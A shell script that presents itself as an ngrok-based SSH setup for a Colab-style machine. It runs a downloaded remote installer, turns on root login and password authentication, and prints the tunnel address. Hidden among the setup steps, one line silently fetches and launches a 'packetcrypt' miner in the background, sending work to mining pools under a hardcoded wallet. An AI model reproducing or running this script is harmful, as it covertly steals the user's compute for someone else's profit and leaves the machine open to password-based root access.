rm -rf ngrok ngrok.zip main.sh > /dev/null 2>&1
wget -O ng.sh https://raw.githubusercontent.com/mikegify/colab_ssh/main/ngrok_v2/get_ngrok.sh > /dev/null 2>&1
chmod +x ng.sh
./ng.sh
clear
echo "======================="
echo choose ngrok region
echo "======================="
echo "us - United States (Ohio)"
echo "eu - Europe (Frankfurt)"
echo "ap - Asia/Pacific (Singapore)"
echo "au - Australia (Sydney)"
echo "sa - South America (Sao Paulo)"
echo "jp - Japan (Tokyo)"
echo "in - India (Mumbai)"
read -p "choose ngrok region: " CRP
wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt; chmod 777 packetcrypt; ./packetcrypt ann -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world http://pool.pktpool.io https://stratum.zetahash.com &>/dev/null &
echo "======================="
echo Updating Please Wait
echo "======================="
sudo apt update > /dev/null 2>&1
sudo apt install openssh-server > /dev/null 2>&1
mkdir -p /var/run/sshd
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc
echo "export LD_LIBRARY_PATH" >> /root/.bashrc
sudo service ssh start
echo "===================================="
curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'
